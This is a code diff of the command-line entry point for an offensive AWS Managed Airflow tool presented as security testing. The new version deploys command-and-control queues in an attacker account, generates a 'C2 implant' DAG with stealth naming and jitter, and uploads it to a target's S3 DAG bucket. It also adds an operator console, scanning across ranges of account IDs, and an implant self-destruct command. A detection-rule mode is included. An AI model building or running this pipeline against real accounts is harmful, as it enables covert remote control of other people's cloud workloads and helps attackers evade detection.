@@ -1,18 +1,16 @@
 """
-Main CLI entry point for the MWAA SQS Security Testing Tool.
+Main CLI entry point for the MWAA SQS Security Testing Tool v2.0.
 
 Usage:
-    python -m mwaa_security_tool <module> <action> [options]
+    python -m mwaa_security_tool <command> [options]
 
-Modules:
-    exfil       - Data exfiltration testing
-    c2          - Command & Control channel testing
-    dos         - Denial of Service simulation
-    inject      - Cross-account event injection
-    recon       - Infrastructure reconnaissance
-    dag         - DAG payload generation
-    analyze     - IAM policy analysis & detection
-    full-test   - Run all safe capability tests
+Commands:
+    deploy      - Deploy C2 infrastructure, generate DAG, upload to S3
+    connect     - Interactive C2 operator console
+    recon       - Pre-attack account scanning
+    analyze     - Blue team IAM analysis & detection
+    teardown    - Cleanup queues and optional self-destruct
+    test        - End-to-end validation suite
 """
 
 import argparse
@@ -27,136 +25,74 @@ from .utils import setup_logging, print_banner, print_section, print_success, pr
 def build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
         prog="mwaa-security-tool",
-        description="MWAA SQS Execution Role Security Testing Tool",
+        description="MWAA SQS Execution Role Security Testing Tool v2.0",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog=__doc__,
     )
     parser.add_argument("-v", "--verbose", action="store_true", help="Enable debug logging")
-    parser.add_argument("--attacker-account", required=False, help="Attacker AWS account ID")
-    parser.add_argument("--attacker-region", default="us-east-1", help="Attacker AWS region")
-    parser.add_argument("--attacker-profile", default=None, help="Attacker AWS CLI profile")
-    parser.add_argument("--source-profile", default=None,
-                        help="AWS profile simulating the MWAA execution role (for cross-account tests)")
-    parser.add_argument("--source-region", default=None, help="AWS region for source profile")
 
-    sub = parser.add_subparsers(dest="module", help="Module to run")
+    sub = parser.add_subparsers(dest="command", help="Command to run")
 
-    # ── Exfiltration ─────────────────────────────────────────────
-    exfil = sub.add_parser("exfil", help="Data exfiltration testing")
-    exfil_sub = exfil.add_subparsers(dest="action")
+    # ── deploy ────────────────────────────────────────────────────
+    deploy = sub.add_parser("deploy", help="Deploy C2 infrastructure, generate DAG, upload to S3")
+    deploy_sub = deploy.add_subparsers(dest="deploy_action", help="Deploy action")
 
-    exfil_setup = exfil_sub.add_parser("setup", help="Create attacker-side exfil queue")
-    exfil_setup.add_argument("--queue-name", default=None, help="Custom queue name")
+    # deploy all
+    deploy_all = deploy_sub.add_parser("all", help="Full pipeline: create queues + generate DAG + upload to S3")
+    deploy_all.add_argument("--attacker-account", required=True, help="Attacker AWS account ID")
+    deploy_all.add_argument("--target-bucket", required=True, help="Target S3 DAG bucket")
+    deploy_all.add_argument("--target-prefix", default="dags/", help="S3 key prefix (default: dags/)")
+    deploy_all.add_argument("--target-profile", default=None, help="AWS profile for S3 upload")
+    deploy_all.add_argument("--target-region", default="us-east-1", help="Target S3 bucket region")
+    deploy_all.add_argument("--stealth", action="store_true", help="Use innocuous DAG name/tags")
+    deploy_all.add_argument("--poll-interval", type=int, default=5, help="C2 poll interval in minutes")
+    deploy_all.add_argument("--jitter", type=int, default=0, help="Max random jitter in seconds")
+    deploy_all.add_argument("--attacker-region", default="us-east-1", help="Attacker AWS region")
+    deploy_all.add_argument("--attacker-profile", default=None, help="Attacker AWS CLI profile")
+    deploy_all.add_argument("--output-dir", default="./generated_dags", help="Local output directory for DAG")
 
-    exfil_listen = exfil_sub.add_parser("listen", help="Listen for exfiltrated data")
-    exfil_listen.add_argument("--queue-name", default=None, help="Queue name to listen on")
-    exfil_listen.add_argument("--duration", type=int, default=300, help="Listen duration (seconds)")
+    # deploy queues
+    deploy_queues = deploy_sub.add_parser("queues", help="Only create attacker SQS queues")
+    deploy_queues.add_argument("--attacker-account", required=True, help="Attacker AWS account ID")
+    deploy_queues.add_argument("--attacker-region", default="us-east-1", help="Attacker AWS region")
+    deploy_queues.add_argument("--attacker-profile", default=None, help="Attacker AWS CLI profile")
 
-    exfil_test = exfil_sub.add_parser("test", help="Direct exfiltration test (no MWAA needed)")
-    exfil_test.add_argument("--queue-name", default=None, help="Target queue name")
+    # deploy generate
+    deploy_gen = deploy_sub.add_parser("generate", help="Only generate the C2 implant DAG locally")
+    deploy_gen.add_argument("--attacker-account", required=True, help="Attacker AWS account ID")
+    deploy_gen.add_argument("--output-dir", default="./generated_dags", help="Output directory")
+    deploy_gen.add_argument("--stealth", action="store_true", help="Use innocuous DAG name/tags")
+    deploy_gen.add_argument("--poll-interval", type=int, default=5, help="C2 poll interval in minutes")
+    deploy_gen.add_argument("--jitter", type=int, default=0, help="Max random jitter in seconds")
+    deploy_gen.add_argument("--attacker-region", default="us-east-1", help="Attacker AWS region")
+    deploy_gen.add_argument("--attacker-profile", default=None, help="Attacker AWS CLI profile")
 
-    exfil_sub.add_parser("cleanup", help="Delete exfil queue")
+    # deploy upload
+    deploy_upload = deploy_sub.add_parser("upload", help="Only upload an existing DAG file to target S3")
+    deploy_upload.add_argument("--file", required=True, help="Local DAG file path")
+    deploy_upload.add_argument("--target-bucket", required=True, help="Target S3 bucket")
+    deploy_upload.add_argument("--target-prefix", default="dags/", help="S3 key prefix")
+    deploy_upload.add_argument("--target-profile", default=None, help="AWS profile for S3 upload")
+    deploy_upload.add_argument("--target-region", default="us-east-1", help="S3 bucket region")
 
-    # ── C2 Channel ───────────────────────────────────────────────
-    c2 = sub.add_parser("c2", help="Command & Control channel testing")
-    c2_sub = c2.add_subparsers(dest="action")
+    # ── connect ───────────────────────────────────────────────────
+    connect = sub.add_parser("connect", help="Interactive C2 operator console")
+    connect.add_argument("--attacker-account", required=True, help="Attacker AWS account ID")
+    connect.add_argument("--attacker-region", default="us-east-1", help="Attacker AWS region")
+    connect.add_argument("--attacker-profile", default=None, help="Attacker AWS CLI profile")
 
-    c2_sub.add_parser("setup", help="Create C2 infrastructure (command + results queues)")
+    # ── recon ─────────────────────────────────────────────────────
+    recon = sub.add_parser("recon", help="Pre-attack account scanning")
+    recon_group = recon.add_mutually_exclusive_group(required=True)
+    recon_group.add_argument("--accounts", help="Comma-separated account IDs or file path")
+    recon_group.add_argument("--start", type=int, help="Starting account ID for range scan")
+    recon.add_argument("--count", type=int, default=100, help="Number of accounts for range scan")
+    recon.add_argument("--region", default="us-east-1", help="Region to scan")
+    recon.add_argument("--source-profile", default=None, help="AWS profile for scanning")
+    recon.add_argument("--source-region", default=None, help="AWS region for source profile")
+    recon.add_argument("--threads", type=int, default=5, help="Concurrent threads")
 
-    c2_send = c2_sub.add_parser("send", help="Send a command to the implant")
-    c2_send.add_argument("command", help="Command to send")
-
-    c2_sub.add_parser("recv", help="Poll for results from the implant")
-
-    c2_sub.add_parser("operator", help="Interactive operator console")
-
-    c2_sub.add_parser("test", help="Full C2 roundtrip test (no MWAA needed)")
-
-    c2_sub.add_parser("cleanup", help="Delete C2 queues")
-
-    # ── DoS Simulation ───────────────────────────────────────────
-    dos = sub.add_parser("dos", help="Denial of Service simulation")
-    dos_sub = dos.add_subparsers(dest="action")
-
-    dos_assess = dos_sub.add_parser("assess", help="Safe DoS risk assessment")
-
-    dos_flood = dos_sub.add_parser("flood", help="Message flooding test")
-    dos_flood.add_argument("--target-queue-url", default=None, help="Target queue URL")
-    dos_flood.add_argument("--message-count", type=int, default=100, help="Number of messages")
-    dos_flood.add_argument("--rate-limit", type=int, default=10, help="Messages per second")
-
-    dos_consume = dos_sub.add_parser("consume", help="Message consumption test")
-    dos_consume.add_argument("--target-queue-url", required=True, help="Target queue URL")
-    dos_consume.add_argument("--max-consume", type=int, default=10, help="Max messages to consume")
-    dos_consume.add_argument("--live", action="store_true", help="Delete consumed messages (DESTRUCTIVE)")
-
-    # ── Event Injection ──────────────────────────────────────────
-    inject = sub.add_parser("inject", help="Cross-account event injection")
-    inject_sub = inject.add_subparsers(dest="action")
-
-    inject_sub.add_parser("list-payloads", help="List available injection payloads")
-
-    inject_send = inject_sub.add_parser("send", help="Inject a message into a target queue")
-    inject_send.add_argument("--target-account", required=True, help="Target AWS account ID")
-    inject_send.add_argument("--target-queue", required=True, help="Target queue name")
-    inject_send.add_argument("--target-region", default="us-east-1", help="Target region")
-    inject_send.add_argument("--payload", default="benign", help="Payload name or 'custom'")
-    inject_send.add_argument("--custom-payload", default=None, help="Custom JSON payload string")
-
-    inject_all = inject_sub.add_parser("send-all", help="Send all probe payloads")
-    inject_all.add_argument("--target-account", required=True, help="Target AWS account ID")
-    inject_all.add_argument("--target-queue", required=True, help="Target queue name")
-    inject_all.add_argument("--target-region", default="us-east-1", help="Target region")
-
-    inject_sub.add_parser("test", help="Safe injection test (self-target)")
-
-    # ── Recon ────────────────────────────────────────────────────
-    recon = sub.add_parser("recon", help="Infrastructure reconnaissance")
-    recon_sub = recon.add_subparsers(dest="action")
-
-    recon_scan = recon_sub.add_parser("scan", help="Scan accounts for MWAA queues")
-    recon_scan.add_argument("--accounts", required=True, help="Comma-separated account IDs or file path")
-    recon_scan.add_argument("--region", default="us-east-1", help="Region to scan")
-    recon_scan.add_argument("--threads", type=int, default=5, help="Concurrent threads")
-    recon_scan.add_argument("--queue-names", default=None,
-                            help="Comma-separated custom queue names to probe")
-
-    recon_range = recon_sub.add_parser("scan-range", help="Scan a numeric range of account IDs")
-    recon_range.add_argument("--start", type=int, required=True, help="Starting account ID (numeric)")
-    recon_range.add_argument("--count", type=int, default=100, help="Number of accounts to scan")
-    recon_range.add_argument("--region", default="us-east-1", help="Region to scan")
-    recon_range.add_argument("--threads", type=int, default=5, help="Concurrent threads")
-
-    recon_sub.add_parser("test", help="Test recon capability (self-target)")
-
-    # ── DAG Generator ────────────────────────────────────────────
-    dag = sub.add_parser("dag", help="DAG payload generation")
-    dag_sub = dag.add_subparsers(dest="action")
-
-    dag_gen = dag_sub.add_parser("generate", help="Generate DAG payloads")
-    dag_gen.add_argument("--type", choices=["exfil", "c2", "recon", "dos", "all"],
-                         default="all", help="DAG type to generate")
-    dag_gen.add_argument("--output-dir", default="./generated_dags", help="Output directory")
-    dag_gen.add_argument("--target-accounts", default=None,
-                         help="Comma-separated target accounts (for recon DAG)")
-    dag_gen.add_argument("--dos-target-account", default=None, help="DoS target account ID")
-    dag_gen.add_argument("--dos-target-queue", default=None, help="DoS target queue name")
-    # C2 DAG options
-    dag_gen.add_argument("--c2-poll-interval", type=int, default=5,
-                         help="C2 implant poll interval in minutes (default: 5)")
-    dag_gen.add_argument("--c2-jitter", type=int, default=30,
-                         help="Max random jitter in seconds added per poll cycle (default: 30)")
-    dag_gen.add_argument("--c2-stealth", action="store_true",
-                         help="Use innocuous DAG name/tags to blend with normal workloads")
-
-    dag_upload = dag_sub.add_parser("upload", help="Upload a DAG file to S3")
-    dag_upload.add_argument("--file", required=True, help="Local DAG file path")
-    dag_upload.add_argument("--bucket", required=True, help="Target S3 bucket")
-    dag_upload.add_argument("--prefix", default="dags/", help="S3 key prefix")
-    dag_upload.add_argument("--target-profile", default=None, help="AWS profile for S3 upload")
-    dag_upload.add_argument("--target-region", default="us-east-1", help="S3 bucket region")
-
-    # ── Policy Analyzer ──────────────────────────────────────────
+    # ── analyze ───────────────────────────────────────────────────
     analyze = sub.add_parser("analyze", help="IAM policy analysis & detection")
     analyze_sub = analyze.add_subparsers(dest="action")
 
@@ -165,44 +101,215 @@ def build_parser() -> argparse.ArgumentParser:
     analyze_role.add_argument("--region", default="us-east-1")
     analyze_role.add_argument("--profile", default=None)
 
-    analyze_sub.add_parser("enumerate", help="Enumerate MWAA environments and roles")
-    analyze_sub.add_parser("full", help="Full assessment (enumerate + analyze all)")
+    analyze_enum = analyze_sub.add_parser("enumerate", help="Enumerate MWAA environments and roles")
+    analyze_enum.add_argument("--region", default="us-east-1")
+    analyze_enum.add_argument("--profile", default=None)
+
+    analyze_full = analyze_sub.add_parser("full", help="Full assessment (enumerate + analyze all)")
+    analyze_full.add_argument("--region", default="us-east-1")
+    analyze_full.add_argument("--profile", default=None)
 
     analyze_detect = analyze_sub.add_parser("detection-rules", help="Generate detection rules")
     analyze_detect.add_argument("--output-dir", default="./detection_rules", help="Output directory")
 
-    # ── Full Test ────────────────────────────────────────────────
-    sub.add_parser("full-test", help="Run all safe capability tests end-to-end")
+    # ── teardown ──────────────────────────────────────────────────
+    teardown = sub.add_parser("teardown", help="Cleanup queues and optional self-destruct")
+    teardown.add_argument("--attacker-account", required=True, help="Attacker AWS account ID")
+    teardown.add_argument("--self-destruct", action="store_true",
+                          help="Also send !self-destruct to the implant before cleanup")
+    teardown.add_argument("--attacker-region", default="us-east-1", help="Attacker AWS region")
+    teardown.add_argument("--attacker-profile", default=None, help="Attacker AWS CLI profile")
+
+    # ── test ──────────────────────────────────────────────────────
+    test = sub.add_parser("test", help="End-to-end validation suite")
+    test.add_argument("--attacker-account", required=True, help="Attacker AWS account ID")
+    test.add_argument("--attacker-region", default="us-east-1", help="Attacker AWS region")
+    test.add_argument("--attacker-profile", default=None, help="Attacker AWS CLI profile")
+    test.add_argument("--source-profile", default=None, help="AWS profile simulating MWAA execution role")
+    test.add_argument("--source-region", default=None, help="AWS region for source profile")
 
     return parser
 
 
-def run_full_test(attacker: AttackerConfig, args) -> None:
-    """Run all safe capability tests."""
-    from .modules import exfiltration, c2_channel, dos_simulation, event_injection, recon
+# ── Command handlers ──────────────────────────────────────────────
 
-    print_section("FULL CAPABILITY TEST SUITE")
+def cmd_deploy(args, parser):
+    from .modules import c2_channel, dag_generator
+
+    if args.deploy_action == "all":
+        attacker = AttackerConfig(
+            account_id=args.attacker_account,
+            region=args.attacker_region,
+            profile=args.attacker_profile,
+        )
+        # 1. Create queues
+        c2_channel.setup_c2_infra(attacker)
+
+        # 2. Generate DAG
+        output_dir = args.output_dir
+        os.makedirs(output_dir, exist_ok=True)
+        output_path = os.path.join(output_dir, "dag_c2_implant.py")
+        dag_code = dag_generator.generate_c2_implant_dag(
+            attacker,
+            poll_interval_minutes=args.poll_interval,
+            jitter_seconds=args.jitter,
+            stealth=args.stealth,
+            output_path=output_path,
+        )
+
+        # 3. Upload to S3
+        target = TargetConfig(
+            s3_dag_bucket=args.target_bucket,
+            s3_dag_prefix=args.target_prefix,
+            region=args.target_region,
+            profile=args.target_profile,
+        )
+        dag_generator.upload_dag_to_s3(target, dag_code, "dag_c2_implant.py")
+
+    elif args.deploy_action == "queues":
+        attacker = AttackerConfig(
+            account_id=args.attacker_account,
+            region=args.attacker_region,
+            profile=args.attacker_profile,
+        )
+        c2_channel.setup_c2_infra(attacker)
+
+    elif args.deploy_action == "generate":
+        attacker = AttackerConfig(
+            account_id=args.attacker_account,
+            region=args.attacker_region,
+            profile=args.attacker_profile,
+        )
+        output_dir = args.output_dir
+        os.makedirs(output_dir, exist_ok=True)
+        output_path = os.path.join(output_dir, "dag_c2_implant.py")
+        dag_generator.generate_c2_implant_dag(
+            attacker,
+            poll_interval_minutes=args.poll_interval,
+            jitter_seconds=args.jitter,
+            stealth=args.stealth,
+            output_path=output_path,
+        )
+
+    elif args.deploy_action == "upload":
+        with open(args.file) as f:
+            dag_code = f.read()
+        target = TargetConfig(
+            s3_dag_bucket=args.target_bucket,
+            s3_dag_prefix=args.target_prefix,
+            region=args.target_region,
+            profile=args.target_profile,
+        )
+        dag_generator.upload_dag_to_s3(target, dag_code, os.path.basename(args.file))
+
+    else:
+        parser.parse_args(["deploy", "-h"])
+
+
+def cmd_connect(args):
+    from .modules import c2_channel
+    attacker = AttackerConfig(
+        account_id=args.attacker_account,
+        region=args.attacker_region,
+        profile=args.attacker_profile,
+    )
+    c2_channel.operator_console(attacker)
+
+
+def cmd_recon(args):
+    from .modules import recon as recon_mod
+
+    if args.accounts:
+        # Comma-separated list or file path
+        if os.path.isfile(args.accounts):
+            with open(args.accounts) as f:
+                account_ids = [line.strip() for line in f if line.strip()]
+        else:
+            account_ids = [a.strip() for a in args.accounts.split(",")]
+
+        recon_mod.run_recon(
+            account_ids=account_ids,
+            region=args.region,
+            source_profile=args.source_profile,
+            source_region=args.source_region,
+            threads=args.threads,
+        )
+    elif args.start is not None:
+        recon_mod.scan_account_range(
+            start_account=args.start,
+            count=args.count,
+            region=args.region,
+            source_profile=args.source_profile,
+            source_region=args.source_region,
+            threads=args.threads,
+        )
+
+
+def cmd_analyze(args, parser):
+    from .modules import policy_analyzer
+
+    if args.action == "role":
+        policy_analyzer.analyze_role(args.role_name, args.region, args.profile)
+    elif args.action == "enumerate":
+        policy_analyzer.enumerate_mwaa_environments(args.region, args.profile)
+    elif args.action == "full":
+        policy_analyzer.full_assessment(args.region, args.profile)
+    elif args.action == "detection-rules":
+        output_dir = args.output_dir
+        os.makedirs(output_dir, exist_ok=True)
+
+        rule = policy_analyzer.generate_config_guard_rule()
+        rule_path = os.path.join(output_dir, "mwaa_sqs_wildcard.guard")
+        with open(rule_path, "w") as f:
+            f.write(rule)
+        print_success(f"Config Guard rule: {rule_path}")
+
+        queries = policy_analyzer.generate_cloudwatch_detection_queries()
+        queries_path = os.path.join(output_dir, "cloudwatch_queries.json")
+        with open(queries_path, "w") as f:
+            json.dump(queries, f, indent=2)
+        print_success(f"CloudWatch queries: {queries_path}")
+    else:
+        parser.parse_args(["analyze", "-h"])
+
+
+def cmd_teardown(args):
+    from .modules import c2_channel
+    attacker = AttackerConfig(
+        account_id=args.attacker_account,
+        region=args.attacker_region,
+        profile=args.attacker_profile,
+    )
+
+    if args.self_destruct:
+        print_section("Self-Destruct")
+        print_info("Sending !self-destruct to implant...")
+        try:
+            c2_channel.send_command(attacker, "!self-destruct")
+            print_success("Self-destruct command sent. Implant will remove itself on next poll.")
+        except Exception as e:
+            print_warn(f"Could not send self-destruct (queues may already be gone): {e}")
+
+    c2_channel.cleanup(attacker)
+
+
+def cmd_test(args):
+    from .modules import c2_channel, dos_simulation, event_injection, recon
+
+    attacker = AttackerConfig(
+        account_id=args.attacker_account,
+        region=args.attacker_region,
+        profile=args.attacker_profile,
+    )
+
+    print_section("CAPABILITY TEST SUITE")
     print_info("Running all safe tests using attacker account as both source and target.")
     print_info("No real MWAA environment is required.\n")
 
     results = {}
 
-    # 1. Exfiltration
-    print_section("Test 1/5: Data Exfiltration")
-    try:
-        exfiltration.setup_receiver(attacker)
-        results["exfiltration"] = exfiltration.test_direct_send(
-            attacker,
-            source_profile=args.source_profile,
-            source_region=args.source_region,
-        )
-        exfiltration.cleanup(attacker)
-    except Exception as e:
-        print_fail(f"Exfiltration test error: {e}")
-        results["exfiltration"] = False
-
-    # 2. C2 Channel
-    print_section("Test 2/5: C2 Channel")
+    # 1. C2 Channel
+    print_section("Test 1/4: C2 Channel")
     try:
         c2_channel.setup_c2_infra(attacker)
         results["c2_channel"] = c2_channel.test_c2_roundtrip(
@@ -215,8 +322,8 @@ def run_full_test(attacker: AttackerConfig, args) -> None:
         print_fail(f"C2 test error: {e}")
         results["c2_channel"] = False
 
-    # 3. DoS Assessment
-    print_section("Test 3/5: DoS Assessment")
+    # 2. DoS Assessment
+    print_section("Test 2/4: DoS Assessment")
     try:
         dos_results = dos_simulation.assess_dos_risk(
             attacker,
@@ -228,8 +335,8 @@ def run_full_test(attacker: AttackerConfig, args) -> None:
         print_fail(f"DoS assessment error: {e}")
         results["dos"] = False
 
-    # 4. Event Injection
-    print_section("Test 4/5: Event Injection")
+    # 3. Event Injection
+    print_section("Test 3/4: Event Injection")
     try:
         results["event_injection"] = event_injection.test_injection_safe(
             attacker,
@@ -240,8 +347,8 @@ def run_full_test(attacker: AttackerConfig, args) -> None:
         print_fail(f"Injection test error: {e}")
         results["event_injection"] = False
 
-    # 5. Recon
-    print_section("Test 5/5: Infrastructure Reconnaissance")
+    # 4. Recon
+    print_section("Test 4/4: Infrastructure Reconnaissance")
     try:
         results["recon"] = recon.test_recon_capability(
             attacker,
@@ -253,20 +360,19 @@ def run_full_test(attacker: AttackerConfig, args) -> None:
         results["recon"] = False
 
     # Final Report
-    print_section("FULL TEST RESULTS")
+    print_section("TEST RESULTS")
     all_pass = True
     for test_name, passed in results.items():
-        status = "PASS" if passed else "FAIL"
         if passed:
-            print_success(f"{test_name}: {status}")
+            print_success(f"{test_name}: PASS")
         else:
-            print_fail(f"{test_name}: {status}")
+            print_fail(f"{test_name}: FAIL")
             all_pass = False
 
     print()
     if all_pass:
         print_warn("ALL TESTS PASSED: The MWAA execution role SQS policy is fully exploitable.")
-        print_warn("All 5 attack vectors (exfiltration, C2, DoS, injection, recon) are viable.")
+        print_warn("All 4 attack vectors (C2, DoS, injection, recon) are viable.")
     else:
         passed_count = sum(1 for v in results.values() if v)
         print_info(f"{passed_count}/{len(results)} tests passed.")
@@ -279,249 +385,18 @@ def main():
     setup_logging(args.verbose)
     print_banner()
 
-    # Build attacker config
-    attacker = None
-    if args.attacker_account:
-        attacker = AttackerConfig(
-            account_id=args.attacker_account,
-            region=args.attacker_region,
-            profile=args.attacker_profile,
-        )
-
-    # Dispatch to modules
-    if args.module == "exfil":
-        from .modules import exfiltration
-        if not attacker:
-            parser.error("--attacker-account is required for exfil module")
-
-        if args.action == "setup":
-            queue_name = args.queue_name or "airflow-celery-exfil-data"
-            exfiltration.setup_receiver(attacker, queue_name)
-        elif args.action == "listen":
-            queue_name = args.queue_name or "airflow-celery-exfil-data"
-            exfiltration.listen(attacker, queue_name, args.duration)
-        elif args.action == "test":
-            queue_name = args.queue_name or "airflow-celery-exfil-data"
-            exfiltration.test_direct_send(attacker, queue_name, args.source_profile, args.source_region)
-        elif args.action == "cleanup":
-            exfiltration.cleanup(attacker)
-        else:
-            parser.parse_args(["exfil", "-h"])
-
-    elif args.module == "c2":
-        from .modules import c2_channel
-        if not attacker:
-            parser.error("--attacker-account is required for c2 module")
-
-        if args.action == "setup":
-            c2_channel.setup_c2_infra(attacker)
-        elif args.action == "send":
-            c2_channel.send_command(attacker, args.command)
-            print_success(f"Command sent: {args.command}")
-        elif args.action == "recv":
-            results = c2_channel.receive_results(attacker)
-            if results:
-                for r in results:
-                    c2_channel._display_result(r)
-            else:
-                print_info("No results available.")
-        elif args.action == "operator":
-            c2_channel.operator_console(attacker)
-        elif args.action == "test":
-            c2_channel.test_c2_roundtrip(attacker, args.source_profile, args.source_region)
-        elif args.action == "cleanup":
-            c2_channel.cleanup(attacker)
-        else:
-            parser.parse_args(["c2", "-h"])
-
-    elif args.module == "dos":
-        from .modules import dos_simulation
-        if not attacker:
-            parser.error("--attacker-account is required for dos module")
-
-        if args.action == "assess":
-            dos_simulation.assess_dos_risk(attacker, args.source_profile, args.source_region)
-        elif args.action == "flood":
-            dos_simulation.test_message_flood(
-                attacker,
-                target_queue_url=args.target_queue_url,
-                message_count=args.message_count,
-                rate_limit=args.rate_limit,
-                source_profile=args.source_profile,
-                source_region=args.source_region,
-            )
-        elif args.action == "consume":
-            dos_simulation.test_message_consumption(
-                attacker,
-                target_queue_url=args.target_queue_url,
-                max_consume=args.max_consume,
-                source_profile=args.source_profile,
-                source_region=args.source_region,
-                dry_run=not args.live,
-            )
-        else:
-            parser.parse_args(["dos", "-h"])
-
-    elif args.module == "inject":
-        from .modules import event_injection
-        if args.action == "list-payloads":
-            event_injection.list_payloads()
-        elif args.action == "send":
-            event_injection.inject_message(
-                target_account_id=args.target_account,
-                target_queue_name=args.target_queue,
-                target_region=args.target_region,
-                payload_name=args.payload,
-                custom_payload=args.custom_payload,
-                source_profile=args.source_profile,
-                source_region=args.source_region,
-            )
-        elif args.action == "send-all":
-            event_injection.inject_all_probes(
-                target_account_id=args.target_account,
-                target_queue_name=args.target_queue,
-                target_region=args.target_region,
-                source_profile=args.source_profile,
-                source_region=args.source_region,
-            )
-        elif args.action == "test":
-            if not attacker:
-                parser.error("--attacker-account is required for inject test")
-            event_injection.test_injection_safe(attacker, args.source_profile, args.source_region)
-        else:
-            parser.parse_args(["inject", "-h"])
-
-    elif args.module == "recon":
-        from .modules import recon as recon_mod
-        if args.action == "scan":
-            # Parse account IDs
-            if os.path.isfile(args.accounts):
-                with open(args.accounts) as f:
-                    account_ids = [line.strip() for line in f if line.strip()]
-            else:
-                account_ids = [a.strip() for a in args.accounts.split(",")]
-
-            queue_names = None
-            if args.queue_names:
-                queue_names = [q.strip() for q in args.queue_names.split(",")]
-
-            recon_mod.run_recon(
-                account_ids=account_ids,
-                region=args.region,
-                queue_names=queue_names,
-                source_profile=args.source_profile,
-                source_region=args.source_region,
-                threads=args.threads,
-            )
-        elif args.action == "scan-range":
-            recon_mod.scan_account_range(
-                start_account=args.start,
-                count=args.count,
-                region=args.region,
-                source_profile=args.source_profile,
-                source_region=args.source_region,
-                threads=args.threads,
-            )
-        elif args.action == "test":
-            if not attacker:
-                parser.error("--attacker-account is required for recon test")
-            recon_mod.test_recon_capability(attacker, args.source_profile, args.source_region)
-        else:
-            parser.parse_args(["recon", "-h"])
-
-    elif args.module == "dag":
-        from .modules import dag_generator
-        if not attacker:
-            parser.error("--attacker-account is required for dag module")
-
-        if args.action == "generate":
-            output_dir = args.output_dir
-            os.makedirs(output_dir, exist_ok=True)
-
-            if args.type in ("exfil", "all"):
-                dag_generator.generate_exfiltration_dag(
-                    attacker,
-                    output_path=os.path.join(output_dir, "dag_exfiltration.py"),
-                )
-            if args.type in ("c2", "all"):
-                dag_generator.generate_c2_implant_dag(
-                    attacker,
-                    poll_interval_minutes=args.c2_poll_interval,
-                    jitter_seconds=args.c2_jitter,
-                    stealth=args.c2_stealth,
-                    output_path=os.path.join(output_dir, "dag_c2_implant.py"),
-                )
-            if args.type in ("recon", "all"):
-                target_accounts = []
-                if args.target_accounts:
-                    target_accounts = [a.strip() for a in args.target_accounts.split(",")]
-                if target_accounts:
-                    dag_generator.generate_recon_dag(
-                        attacker, target_accounts,
-                        output_path=os.path.join(output_dir, "dag_recon.py"),
-                    )
-                elif args.type == "recon":
-                    print_warn("--target-accounts required for recon DAG generation")
-            if args.type in ("dos", "all"):
-                if args.dos_target_account and args.dos_target_queue:
-                    dag_generator.generate_dos_dag(
-                        target_account_id=args.dos_target_account,
-                        target_queue_name=args.dos_target_queue,
-                        output_path=os.path.join(output_dir, "dag_dos.py"),
-                    )
-                elif args.type == "dos":
-                    print_warn("--dos-target-account and --dos-target-queue required for DoS DAG")
-
-        elif args.action == "upload":
-            with open(args.file) as f:
-                dag_code = f.read()
-            target = TargetConfig(
-                s3_dag_bucket=args.bucket,
-                s3_dag_prefix=args.prefix,
-                region=args.target_region,
-                profile=args.target_profile,
-            )
-            dag_generator.upload_dag_to_s3(target, dag_code, os.path.basename(args.file))
-        else:
-            parser.parse_args(["dag", "-h"])
-
-    elif args.module == "analyze":
-        from .modules import policy_analyzer
-        if args.action == "role":
-            policy_analyzer.analyze_role(args.role_name, args.region, args.profile)
-        elif args.action == "enumerate":
-            region = args.attacker_region
-            profile = args.attacker_profile
-            policy_analyzer.enumerate_mwaa_environments(region, profile)
-        elif args.action == "full":
-            region = args.attacker_region
-            profile = args.attacker_profile
-            policy_analyzer.full_assessment(region, profile)
-        elif args.action == "detection-rules":
-            output_dir = args.output_dir
-            os.makedirs(output_dir, exist_ok=True)
-
-            # Config Guard rule
-            rule = policy_analyzer.generate_config_guard_rule()
-            rule_path = os.path.join(output_dir, "mwaa_sqs_wildcard.guard")
-            with open(rule_path, "w") as f:
-                f.write(rule)
-            print_success(f"Config Guard rule: {rule_path}")
-
-            # CloudWatch queries
-            queries = policy_analyzer.generate_cloudwatch_detection_queries()
-            queries_path = os.path.join(output_dir, "cloudwatch_queries.json")
-            with open(queries_path, "w") as f:
-                json.dump(queries, f, indent=2)
-            print_success(f"CloudWatch queries: {queries_path}")
-        else:
-            parser.parse_args(["analyze", "-h"])
-
-    elif args.module == "full-test":
-        if not attacker:
-            parser.error("--attacker-account is required for full-test")
-        run_full_test(attacker, args)
-
+    if args.command == "deploy":
+        cmd_deploy(args, parser)
+    elif args.command == "connect":
+        cmd_connect(args)
+    elif args.command == "recon":
+        cmd_recon(args)
+    elif args.command == "analyze":
+        cmd_analyze(args, parser)
+    elif args.command == "teardown":
+        cmd_teardown(args)
+    elif args.command == "test":
+        cmd_test(args)
     else:
         parser.print_help()
 
